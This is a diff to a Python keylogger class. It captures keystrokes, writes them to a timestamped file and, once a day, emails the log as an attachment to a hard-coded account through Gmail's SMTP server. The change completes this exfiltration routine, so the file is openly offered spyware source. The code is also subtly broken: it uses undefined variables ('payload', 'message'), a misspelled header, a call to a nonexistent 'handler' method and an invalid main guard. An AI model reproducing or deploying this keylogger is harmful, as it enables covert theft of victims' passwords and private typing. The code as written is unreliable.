@@ -41,7 +41,6 @@ class keyLogger:
       #call this with KET_UP event 
         #here is where we detect keys being pressed
       name = event.name
-
       if len(name) > 1:
             #for special keys
 
@@ -63,43 +62,50 @@ class keyLogger:
         startDatestr = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
         endDatestr = str(self.endDate)[:-7].replace(" ", "-").replace(":", "")
         self.filename = "keylog-"+str(startDatestr)+"-"+str(endDatestr)
-        #f strings loooking iffy here idk if its vim but we'll see used str() to work around
-"""
-    def fileHandler(self):
-        with open(f"{self.filename}.txt", "w") as f:
-            print(self.log, file = f)
+        #f strings loooking iffy here idk if its vim but we'll see|3/20/22 used str() to work around
 
-        print(f"[+] Saved {self.filename}.txt")
-"""
-    def carrierPidgeon(self,email,password,reciver,message):
-        #for using MIME    #def carrierPidgeon(self, email, password, reciver, message, subject):
-"""
+    def fileHandler(self):
+        #try and finally block so that the file closes safely
+        try:
+            f = open(str(self.filename)+".txt", 'w')
+            f.write(self.log)
+        finally:
+            f.close()
+
+    def carrierPidgeon(self, email, password, reciver, logstr, subject):
+#subject will act as the subject and file name to keep code more simple
 #for attatching files
         #setting up MIMEMultipart (https://www.tutorialspoint.com/send-mail-with-attachment-from-your-gmail-account-using-python)
+        
         mime = MIMEMultipart()
         mime['From'] = email
         mime['To'] = reciver
         mime['Subject'] = subject
-        
         #body and attatchments
-#FINISH THIS
-"""
+        mime.attach(MIMEText(logstr, 'plain'))        
+        attach_file_name = subject 
+        attatch_file = open(attatch_file_name, 'rb')
+        payload.set_payload((attatch_file).read())
+        encoders.encode_base64(payload)#encodes attatchment
+        #add header with filename
+        payload.add_header('Content-Decomposition', 'attachment', filename= attatch_file_name)
+        message.attach(payload)
+        
         #connect to mail server
         server = smtplib.SMTP(host="smtp.gmail.com", port=2525)
         server.starttls()
         #logging in
         server.login(email, password)
-        server.sendmail(email, reciver, message)        
+        text = message.as_string()
+        server.sendmail(email, reciver, text)
         server.quit()
 
     def report(self):
         if self.log:
             self.endDate = datetime.now()
-            #backing up to file
-           # self.handler()      for if i want files
-
+            self.handler()
             #emailing
-            self.carrierPidgeon(EMAIL, EMAILPASS, EMAILRECIVER, self.log, naming)
+            self.carrierPidgeon(EMAIL, EMAILPASS, EMAILRECIVER, self.log, self.filename)
             self.log = ""
 
         timer = Timer(interval=self.interval, function=self.report)
@@ -121,4 +127,3 @@ class keyLogger:
 if __name__ = '__main__':
     keyLogger(interval=SECINDAY)
     keyLogger.start()
-   
